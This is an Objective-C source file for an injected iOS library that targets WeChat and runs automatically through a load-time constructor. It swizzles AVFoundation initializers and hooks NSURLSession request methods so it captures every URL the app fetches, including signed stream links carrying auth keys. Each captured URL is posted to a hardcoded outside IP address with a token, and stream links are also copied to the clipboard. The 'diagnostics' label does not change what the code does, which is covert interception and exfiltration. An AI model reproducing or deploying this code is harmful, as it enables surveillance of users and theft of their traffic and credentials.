
//
// ALIWeChatSniffer_NativeVerbose.m
// Native-only verbose sniffer: AV AccessLog + AV swizzle + NSURLSession hooks for extra visibility.
// Use with caution: NSURLSession hooks may interfere with app networking; use for short diagnostics.
//

#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <AVFoundation/AVFoundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

#pragma mark - Config
static NSString * const kPushHost  = @"http://139.155.57.242:8088";
static NSString * const kPushToken = @"@Yy166431";
static inline NSArray<NSString*> *kPushPaths(void){ return @[@"/api/push_raw", @"/api/push_form", @"/push", @"/push_raw"]; }

static const NSTimeInterval kDedupeWindow = 60.0;
static const NSTimeInterval kBootGateDelay = 1.0;

static const BOOL kEnableNSURLSessionHook = YES; // <--- enabled for diagnostics
static const BOOL kCopyOnHit = YES;
static const BOOL kPopupOnHit = YES;

#ifndef DEBUG_LOG
#define DEBUG_LOG 0
#endif
#if DEBUG_LOG
#define LOG(fmt, ...) NSLog((@"[ALI-NATIVE-V] " fmt), ##__VA_ARGS__)
#else
#define LOG(...)
#endif

#pragma mark - Globals
static dispatch_queue_t gq;
static NSMutableDictionary<NSString*, NSDate*> *g_seen;
static id g_accessLogToken1 = nil, g_accessLogToken2 = nil;
static BOOL g_av_swizzled = NO;

#pragma mark - Helpers
static NSString *jsonStringify(NSDictionary *obj){
    if (!obj) return nil;
    NSData *d = [NSJSONSerialization dataWithJSONObject:obj options:0 error:nil];
    return d ? [[NSString alloc] initWithData:d encoding:NSUTF8StringEncoding] : nil;
}
static void _ali_post_chain(NSArray<NSString*> *paths, NSUInteger idx, NSData *body){
    if (idx >= paths.count) return;
    NSString *url = [kPushHost stringByAppendingString:paths[idx]];
    NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:url]];
    req.HTTPMethod = @"POST";
    [req setValue:@"text/plain; charset=utf-8" forHTTPHeaderField:@"Content-Type"];
    [req setValue:kPushToken forHTTPHeaderField:@"X-Token"];
    req.HTTPBody = body;
    [[[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:^(__unused NSData *d, NSURLResponse *r, NSError *e){
        NSInteger sc = [r isKindOfClass:[NSHTTPURLResponse class]] ? ((NSHTTPURLResponse*)r).statusCode : -1;
        if (e || sc < 200 || sc >= 300) _ali_post_chain(paths, idx+1, body);
    }] resume];
}
static void postText(NSString *text){
    if (!text) return;
    _ali_post_chain(kPushPaths(), 0, [text dataUsingEncoding:NSUTF8StringEncoding]);
}

static inline void on_main(void(^blk)(void)){ if (!blk) return; if (NSThread.isMainThread) blk(); else dispatch_async(dispatch_get_main_queue(), blk); }
static BOOL looksLikeStream(NSString *u){ if (!u) return NO; NSString *s=u.lowercaseString; if ([s containsString:@".m3u8"]||[s containsString:@".flv"]||[s containsString:@".ts"]||[s containsString:@".mp4"]) return YES; if ([s containsString:@"auth_key="]||[s containsString:@"txsecret"]||[s containsString:@"vzan"]||[s containsString:@"weizan"]) return YES; return NO; }
static BOOL dedupe_skip(NSString *u){ if (!u) return YES; __block BOOL skip=NO; dispatch_sync(gq, ^{ NSDate *last=g_seen[u]; NSDate *now = [NSDate date]; if (last && [now timeIntervalSinceDate:last] < kDedupeWindow) skip = YES; else { g_seen[u]=now; skip = NO; } }); return skip; }
static void popup_safe(NSString *title, NSString *msg, NSString *copyText){ (void)title; if (copyText.length) on_main(^{ @try{ UIPasteboard.generalPasteboard.string = copyText; }@catch(__unused NSException *e){} }); on_main(^{ @try{ UIWindow *w = UIApplication.sharedApplication.keyWindow ?: UIApplication.sharedApplication.windows.firstObject; if (!w) return; UILabel *lab = [[UILabel alloc] initWithFrame:CGRectMake(20, 80, 280, 60)]; lab.numberOfLines=0; lab.backgroundColor=[[UIColor blackColor] colorWithAlphaComponent:0.7]; lab.textColor=[UIColor whiteColor]; lab.text=msg; lab.layer.cornerRadius=8; lab.layer.masksToBounds=YES; [w addSubview:lab]; dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(2.0*NSEC_PER_SEC)), dispatch_get_main_queue(), ^{ [lab removeFromSuperview]; }); }@catch(__unused NSException *e){} }); }

#pragma mark - Event handling
static void handleCapturedURL(NSString *url, NSString *from){
    if (!url) return;
    if (dedupe_skip(url)) return;
    NSDictionary *evt = @{@"type":@"NATIVE_HIT",@"from":from?:@"native",@"url":url,@"ts":@([[NSDate date] timeIntervalSince1970]*1000)};
    NSString *s = jsonStringify(evt); if (s) postText(s);
    if (looksLikeStream(url) && kPopupOnHit){ if (kCopyOnHit) on_main(^{ UIPasteboard.generalPasteboard.string = url; }); popup_safe(@"捕获流", [NSString stringWithFormat:@"%@\n%@", from?:@"native", url], url); }
}

#pragma mark - AV AccessLog
static void installAVObservers(void){
    @try{
        NSNotificationCenter *nc = [NSNotificationCenter defaultCenter];
        if (!g_accessLogToken1){
            g_accessLogToken1 = [nc addObserverForName:AVPlayerItemNewAccessLogEntryNotification object:nil queue:nil usingBlock:^(NSNotification *note){
                @try{
                    id item = note.object; if (!item) return;
                    if ([item respondsToSelector:@selector(accessLog)]){
                        id log = [item accessLog];
                        if (log && [log respondsToSelector:@selector(events)]){
                            NSArray *evs = [log events]; id ev = evs.lastObject;
                            SEL s = NSSelectorFromString(@"URI");
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Warc-performSelector-leaks"
                            if (ev && [ev respondsToSelector:s]){ NSString *uri = [ev performSelector:s]; if (uri.length) dispatch_async(gq, ^{ handleCapturedURL(uri, @"AVAccessLog"); }); }
#pragma clang diagnostic pop
                        }
                    }
                }@catch(__unused NSException *e){}
            }];
        }
        if (!g_accessLogToken2){
            g_accessLogToken2 = [nc addObserverForName:AVPlayerItemNewErrorLogEntryNotification object:nil queue:nil usingBlock:^(NSNotification *note){
                @try{
                    id item = note.object; if (!item) return;
                    if ([item respondsToSelector:@selector(errorLog)]){
                        id log = [item errorLog];
                        if (log && [log respondsToSelector:@selector(events)]){
                            for (id ev in [log events]){
                                SEL s = NSSelectorFromString(@"URI");
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Warc-performSelector-leaks"
                                if (ev && [ev respondsToSelector:s]){ NSString *uri = [ev performSelector:s]; if (uri.length) dispatch_async(gq, ^{ handleCapturedURL(uri, @"AVErrorLog"); }); }
#pragma clang diagnostic pop
                            }
                        }
                    }
                }@catch(__unused NSException *e){}
            }];
        }
    }@catch(__unused NSException *e){}
}

#pragma mark - AV swizzle (initWithURL)
static id (*orig_AVURLAsset_initWithURL_options)(id, SEL, NSURL*, NSDictionary*) = NULL;
static id (*orig_AVPlayerItem_initWithURL)(id, SEL, NSURL*) = NULL;

static id replaced_AVURLAsset_initWithURL_options(id self, SEL _cmd, NSURL *URL, NSDictionary *options){
    @try{ if (URL && URL.absoluteString) dispatch_async(gq, ^{ handleCapturedURL(URL.absoluteString, @"AVURLAsset(swizzle)"); }); }@catch(__unused NSException *e){}
    if (orig_AVURLAsset_initWithURL_options) return orig_AVURLAsset_initWithURL_options(self, _cmd, URL, options);
    return ((id (*)(id, SEL, NSURL*, NSDictionary*))objc_msgSend)(self, _cmd, URL, options);
}
static id replaced_AVPlayerItem_initWithURL(id self, SEL _cmd, NSURL *URL){
    @try{ if (URL && URL.absoluteString) dispatch_async(gq, ^{ handleCapturedURL(URL.absoluteString, @"AVPlayerItem(swizzle)"); }); }@catch(__unused NSException *e){}
    if (orig_AVPlayerItem_initWithURL) return orig_AVPlayerItem_initWithURL(self, _cmd, URL);
    return ((id (*)(id, SEL, NSURL*))objc_msgSend)(self, _cmd, URL);
}

static void install_av_swizzles_safe(void){
    @try{
        if (g_av_swizzled) return;
        Class a = NSClassFromString(@"AVURLAsset");
        Class p = NSClassFromString(@"AVPlayerItem");
        if (!a && !p) return;
        if (a){
            SEL sel = @selector(initWithURL:options:); Method m = class_getInstanceMethod(a, sel);
            if (m){
                orig_AVURLAsset_initWithURL_options = (void*)method_getImplementation(m);
                method_setImplementation(m, (IMP)replaced_AVURLAsset_initWithURL_options);
                LOG(@"[install] AVURLAsset swizzled");
            }
        }
        if (p){
            SEL sel2 = @selector(initWithURL:); Method m2 = class_getInstanceMethod(p, sel2);
            if (m2){
                orig_AVPlayerItem_initWithURL = (void*)method_getImplementation(m2);
                method_setImplementation(m2, (IMP)replaced_AVPlayerItem_initWithURL);
                LOG(@"[install] AVPlayerItem swizzled");
            }
        }
        g_av_swizzled = YES;
        NSDictionary *ev = @{@"type":@"AV_SWIZZLES_INSTALLED",@"ts":@([[NSDate date] timeIntervalSince1970]*1000)};
        NSString *s = jsonStringify(ev); if (s) postText(s);
    }@catch(__unused NSException *e){ LOG(@"swizzle err %@", e); }
}

#pragma mark - NSURLSession hooks (diagnostics)
static NSURLSessionTask* (*orig_NSURLSession_dataTaskWithRequest)(id, SEL, NSURLRequest*);
static NSURLSessionTask* (*orig_NSURLSession_dataTaskWithURL)(id, SEL, NSURL*);

static NSURLSessionTask* replaced_NSURLSession_dataTaskWithRequest(id self, SEL _cmd, NSURLRequest *req){
    @try{ if (req.URL.absoluteString) dispatch_async(gq, ^{ NSDictionary *evt=@{@"type":@"NSURL_REQ",@"from":@"NSURLSession(Request)",@"url":req.URL.absoluteString,@"ts":@([[NSDate date] timeIntervalSince1970]*1000)}; NSString *s=jsonStringify(evt); if(s) postText(s); }); }@catch(__unused NSException *e){}
    return orig_NSURLSession_dataTaskWithRequest(self, _cmd, req);
}
static NSURLSessionTask* replaced_NSURLSession_dataTaskWithURL(id self, SEL _cmd, NSURL *u){
    @try{ if (u.absoluteString) dispatch_async(gq, ^{ NSDictionary *evt=@{@"type":@"NSURL_REQ",@"from":@"NSURLSession(URL)",@"url":u.absoluteString,@"ts":@([[NSDate date] timeIntervalSince1970]*1000)}; NSString *s=jsonStringify(evt); if(s) postText(s); }); }@catch(__unused NSException *e){}
    return orig_NSURLSession_dataTaskWithURL(self, _cmd, u);
}
static void install_nsurlsession_hooks(void){
    if (!kEnableNSURLSessionHook) return;
    @try{
        Class c = NSClassFromString(@"NSURLSession");
        if (!c) return;
        Method m1 = class_getInstanceMethod(c, @selector(dataTaskWithRequest:));
        if (m1){ orig_NSURLSession_dataTaskWithRequest = (void*)method_getImplementation(m1); method_setImplementation(m1, (IMP)replaced_NSURLSession_dataTaskWithRequest); LOG(@"[install] NSURLSession dataTaskWithRequest hooked"); }
        Method m2 = class_getInstanceMethod(c, @selector(dataTaskWithURL:));
        if (m2){ orig_NSURLSession_dataTaskWithURL = (void*)method_getImplementation(m2); method_setImplementation(m2, (IMP)replaced_NSURLSession_dataTaskWithURL); LOG(@"[install] NSURLSession dataTaskWithURL hooked"); }
        NSDictionary *ev=@{@"type":@"NSURL_HOOKS_INSTALLED",@"ts":@([[NSDate date] timeIntervalSince1970]*1000)}; NSString *s=jsonStringify(ev); if(s) postText(s);
    }@catch(__unused NSException *e){ LOG(@"ns hook err %@", e); }
}

#pragma mark - Startup
static void start_if_needed(void){
    dispatch_async(dispatch_get_main_queue(), ^{
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(kBootGateDelay*NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
            installAVObservers();
            install_av_swizzles_safe();
            install_nsurlsession_hooks();
            NSDictionary *ev=@{@"type":@"LOADER_INIT_NATIVE_VERBOSE",@"app":@"WeChat",@"ts":@([[NSDate date] timeIntervalSince1970]*1000)}; NSString *s=jsonStringify(ev); if(s) postText(s);
        });
    });
}

__attribute__((constructor))
static void init_all(void){
    if (!gq) gq = dispatch_queue_create("com.ali.native.verbose", DISPATCH_QUEUE_SERIAL);
    if (!g_seen) g_seen = [NSMutableDictionary dictionary];
    NSNotificationCenter *nc = [NSNotificationCenter defaultCenter];
    [nc addObserverForName:UIApplicationDidFinishLaunchingNotification object:nil queue:nil usingBlock:^(__unused NSNotification *n){ start_if_needed(); }];
    [nc addObserverForName:UIApplicationDidBecomeActiveNotification object:nil queue:nil usingBlock:^(__unused NSNotification *n){ start_if_needed(); }];
    if (NSClassFromString(@"UIScene")){
        [nc addObserverForName:@"UISceneDidActivateNotification" object:nil queue:nil usingBlock:^(__unused NSNotification *n){ start_if_needed(); }];
    }
}
